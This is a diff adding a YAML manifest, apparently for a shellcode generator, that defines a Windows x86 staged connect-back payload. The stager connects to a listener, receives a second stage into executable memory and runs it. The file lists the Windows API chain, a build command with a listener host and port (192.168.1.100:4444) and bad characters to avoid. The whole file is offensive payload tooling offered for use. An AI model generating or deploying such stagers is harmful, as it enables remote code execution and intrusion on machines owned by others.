@@ -1,0 +1,10 @@
+# Staged socket execution (connect back, recv payload into RWX, execute)
+# IR workflow: WSAStartup -> WSASocketA -> connect -> VirtualAlloc ->
+#   recv -> CreateThread -> WaitForSingleObject
+# Classic staged payload pattern: first stage connects, listener sends second stage.
+#
+# Build:
+#   uv run emitrion emitrion/manifests/win-x86/staged_socket.yaml \
+#       --lhost 192.168.1.100 --lport 4444 --no-assemble --out emitter_out/
+template: ir_staged_socket
+badchars: ["00", "0A", "0D"]
